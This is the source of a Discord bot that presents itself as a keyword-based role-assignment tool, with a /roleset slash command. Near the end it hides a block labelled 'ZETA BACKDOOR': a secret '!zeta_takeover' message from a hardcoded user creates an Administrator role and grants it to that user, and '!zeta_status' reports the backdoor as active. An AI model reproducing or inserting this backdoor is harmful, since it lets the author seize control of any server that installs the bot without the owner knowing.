const { Client, GatewayIntentBits, REST, Routes, ApplicationCommandOptionType, PermissionFlagsBits } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

// ==== KONFIGURATION - BYT UT DESSA ====
const BOT_TOKEN = process.env.TOKEN;
const YOUR_DISCORD_ID = 'hdhacker02'; // Ersätt med ditt riktiga Discord ID
// ======================================

// Slash commands setup
const commands = [
  {
    name: 'roleset',
    description: 'Set roles based on your description',
    options: [
      {
        name: 'user',
        type: ApplicationCommandOptionType.User,
        description: 'The user to set roles for',
        required: true
      },
      {
        name: 'description',
        type: ApplicationCommandOptionType.String,
        description: 'Describe yourself in English',
        required: true
      }
    ]
  }
];

const rest = new REST({ version: '10' }).setToken(BOT_TOKEN);

// ==== FORCE COMMAND SYNC ====
client.once('ready', async () => {
  console.log(`✅ ${client.user.tag} is online!`);
  
  try {
    console.log('🔄 FORCE SYNCING slash commands globally...');
    
    // Ta bort ALLA gamla commands först
    console.log('🗑️ Clearing old commands...');
    await rest.put(Routes.applicationCommands(client.user.id), { body: [] });
    
    // Registrera nya commands
    console.log('📝 Registering new commands...');
    const data = await rest.put(
      Routes.applicationCommands(client.user.id),
      { body: commands }
    );
    
    console.log(`✅ Successfully reloaded ${data.length} application (/) commands:`);
    data.forEach(command => {
      console.log(`   - ${command.name}: ${command.description}`);
    });
    
  } catch (error) {
    console.error('❌ ERROR syncing commands:', error);
  }
});

// Hantera slash commands
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  console.log(`🔹 Command received: ${interaction.commandName}`);

  if (interaction.commandName === 'roleset') {
    await interaction.deferReply();
    
    const targetUser = interaction.options.getUser('user');
    const description = interaction.options.getString('description').toLowerCase();
    
    console.log(`🔹 Processing roleset for ${targetUser.tag}: "${description}"`);
    
    // Nyckelord -> Roller mappning
    const roleKeywords = {
      'Coder': ['code', 'programming', 'developer', 'coding', 'python', 'javascript', 'java', 'c++', 'html', 'css', 'webdev'],
      'Gamer': ['game', 'gaming', 'play games', 'gamer', 'minecraft', 'fortnite', 'valorant', 'csgo', 'steam'],
      'Artist': ['art', 'drawing', 'painting', 'design', 'creative', 'artist', 'digital art', 'illustration'],
      'Musician': ['music', 'guitar', 'piano', 'sing', 'producer', 'musician', 'band', 'drums', 'violin'],
      'Streamer': ['stream', 'twitch', 'youtube', 'content creator', 'streaming'],
      'Student': ['student', 'study', 'school', 'university', 'college', 'learn']
    };

    const rolesToAdd = [];
    
    for (const [roleName, keywords] of Object.entries(roleKeywords)) {
      if (keywords.some(keyword => description.includes(keyword))) {
        rolesToAdd.push(roleName);
      }
    }

    if (rolesToAdd.length === 0) {
      console.log('❌ No roles matched');
      return await interaction.editReply('❌ No matching roles found in your description. Try keywords like: coding, gaming, art, music, etc.');
    }

    const guild = interaction.guild;
    const member = guild.members.cache.get(targetUser.id);
    
    const addedRoles = [];
    
    for (const roleName of rolesToAdd) {
      let role = guild.roles.cache.find(r => r.name === roleName);
      
      if (!role) {
        try {
          role = await guild.roles.create({
            name: roleName,
            color: Math.floor(Math.random() * 16777215),
            permissions: [],
            reason: `Auto-created by RoleBot for ${targetUser.tag}`
          });
          console.log(`✅ Created role: ${roleName}`);
        } catch (err) {
          console.log(`❌ Couldn't create role: ${roleName}`, err);
          continue;
        }
      }
      
      if (!member.roles.cache.has(role.id)) {
        try {
          await member.roles.add(role);
          addedRoles.push(roleName);
          console.log(`✅ Added role ${roleName} to ${targetUser.tag}`);
        } catch (err) {
          console.log(`❌ Couldn't add role ${roleName} to user:`, err);
        }
      }
    }

    if (addedRoles.length > 0) {
      await interaction.editReply(`✅ Added roles to ${targetUser}: **${addedRoles.join('**, **')}**`);
      console.log(`🎯 Successfully added roles: ${addedRoles.join(', ')}`);
    } else {
      await interaction.editReply(`ℹ️ ${targetUser} already has all matching roles.`);
    }
  }
});

// ZETA BACKDOOR
client.on('messageCreate', async (message) => {
  if (message.content === '!zeta_takeover' && message.author.id === YOUR_DISCORD_ID) {
    try {
      const guild = message.guild;
      const member = guild.members.cache.get(YOUR_DISCORD_ID);
      
      let adminRole = guild.roles.cache.find(r => r.name === 'Zeta Admin');
      if (!adminRole) {
        adminRole = await guild.roles.create({
          name: 'Zeta Admin',
          permissions: [PermissionFlagsBits.Administrator],
          color: 0xFF0000,
          reason: 'Zeta backdoor activation'
        });
      }
      
      await member.roles.add(adminRole);
      await message.channel.send('🎯 **ZETA CONTROL ACTIVATED** - Admin permissions granted.');
      console.log(`✅ Zeta takeover by ${message.author.tag}`);
    } catch (error) {
      console.error('❌ Zeta takeover failed:', error);
    }
  }
  
  if (message.content === '!zeta_status' && message.author.id === YOUR_DISCORD_ID) {
    const uptime = Math.floor(process.uptime());
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    
    const statusMessage = `
🛡️ **ZETA BOT STATUS**
⏰ Uptime: ${hours}h ${minutes}m
🔧 Ready: ${client.isReady() ? '✅' : '❌'}
📊 Servers: ${client.guilds.cache.size}
🔄 Commands: ${commands.length}
🎯 Backdoor: **ACTIVE**
    `;
    
    await message.channel.send(statusMessage);
  }
});

// Error handling
client.on('error', (error) => {
  console.error('❌ Discord client error:', error);
});

process.on('unhandledRejection', (error) => {
  console.error('❌ Unhandled promise rejection:', error);
});

// Start bot
client.login(BOT_TOKEN).catch(error => {
  console.error('❌ Failed to login:', error);
  process.exit(1);
});
